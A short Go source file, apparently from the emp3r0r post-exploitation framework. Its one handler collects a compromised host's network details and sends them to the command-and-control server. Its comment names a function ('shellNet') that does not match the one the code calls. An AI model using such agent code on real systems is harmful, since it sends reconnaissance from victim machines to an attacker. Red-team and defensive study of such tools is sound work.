package handler

import (
	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/c2transport"
	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/shellhelper"
	"github.com/spf13/cobra"
)

// netHelperCmdRun displays network information.
func netHelperCmdRun(cmd *cobra.Command, args []string) {
	// Assume shellNet() exists and returns network info.
	out := shellhelper.GetNetworkDetails()
	c2transport.NotifyC2(cmd, "%s", out)
}
